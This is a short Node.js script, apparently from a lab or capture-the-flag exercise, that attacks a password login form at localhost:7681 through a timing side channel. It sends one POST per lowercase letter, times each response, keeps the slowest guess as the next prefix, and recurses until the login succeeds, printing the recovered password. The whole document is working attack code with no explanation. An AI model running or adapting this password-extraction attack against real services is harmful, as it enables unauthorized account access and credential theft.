var fetch = require('node-fetch');

function tryLogin(password) {
    return fetch('http://localhost:7681/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
        body: `password=${password}`,
    });
}

let alphabet = 'abcdefghijklmnopqrstuvwxyz';

async function hackPassword(check = '') {
    let max = 0;
    let temp = ''
    for (let letter of alphabet) {
        let guess = check + letter;
        let startTime = new Date().getTime();
        let resp = await tryLogin(guess);
        let reqTime = new Date().getTime() - startTime;

        console.log(`guess: ${guess}  took ${reqTime} milliseconds  login success: ${resp.ok}`);
        [max, temp] = (reqTime > max) ? [reqTime, guess] : [max, temp];
        console.log(max, check);
        
        if(resp.ok){
            console.log(`Password is ${guess}`);
            return guess;
        }
    }
    check = temp;
    
    hackPassword(check);
}

hackPassword();